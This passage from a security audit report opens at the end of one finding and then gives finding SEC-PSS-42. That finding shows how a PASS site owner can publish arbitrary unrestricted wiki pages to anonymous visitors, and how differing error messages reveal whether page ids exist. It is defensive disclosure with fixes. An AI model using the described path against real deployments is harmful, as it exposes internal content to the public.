- **Not confirmed:** the limits bound it (ten a client in ten minutes, five an address an hour, 500 a site an hour: `regLimits`), and it needs an open offer. The ticket and receipt mail text was not read for the same name.
- **Suggested fix:** Keep the typed name on the registration (or the reservation) and show that, never the matched party's name; or do not match an unverified address to an existing party until the address is confirmed.

#### SEC-PSS-42. A site owner can publish any wiki page of an unrestricted space as the site's public page

Medium; reported (likely; a helper reader's item, not checked by the slice's reviewer).

- **Where:** `service/mantle/forum/Forum.js` publishSitePage (starts 3275), getSitePage (starts 1976); `runtime/components/base/framework/service/org/moqui/resource/WikiServices.xml:1802-1808`
- **Reached by:** a signed-in public account that is an owner of a PASS site (an owner is named by an operator at create#Site and can make other members owners with set#SiteRole), the PASS operation `publishSitePage` (PATCH `pages/{pageRole}`) with a `wikiPageId` and `versionName`.
- **What happens:** The only checks beyond site ownership are the wiki's `canUpdate` for the page and that `versionName` equals the page's published version. `canUpdate` is true for any user account when neither the space nor the page has `restrictView` or `restrictUpdate` set, so the wiki's own rule does not separate a public account from staff; the page need not be in the site's publishing space or related to the site at all. The bound page's published text is then served to anonymous visitors by `getSitePage` (`guidelines` or `about`). The two refusals differ (`Wiki publication access required`, `Select the exact currently published wiki revision`), so the operation also tells an owner whether a page id exists and has that published version.
- **Evidence:** `Forum.js` publishSitePage `.name('org.moqui.resource.WikiServices.get#WikiPageAccess').parameters({ wikiPageId: p.wikiPageId })` and `if (!page || !p.versionName || page.publishedVersionName !== p.versionName) invalid(...)`; no check of the page's space
- **Evidence:** `WikiServices.xml:1802` `canView = adminGroup || ((space.restrictView !== 'Y' || ...) && (!page || page.restrictView !== 'Y' || ...))`; `:1807` `canUpdate = canView && !readOnly && (canAdmin || ((space.restrictUpdate !== 'Y' || spaceUser?.allowUpdate === 'Y') && (!page || page.restrictUpdate !== 'Y' || pageUser?.allowUpdate === 'Y')))`
- **Not confirmed:** how guessable `wikiPageId` and the published version name are (not traced); whether deployments make non-staff accounts site owners; whether internal wiki spaces are created restricted by default (the entity fields have no default: `ResourceEntities.xml:789-790`). `updateSite` has the related gap: an owner sets `publishingWikiSpaceId` to any existing space (`one('moqui.resource.wiki.WikiSpace', {wikiSpaceId: p.publishingWikiSpaceId})`, NotFound otherwise).
- **Suggested fix:** Require the page to be in a space bound to the site (the site's publishing space or a site page space) and require an internal party or an explicit wiki grant, not the wiki's default-open update rule.

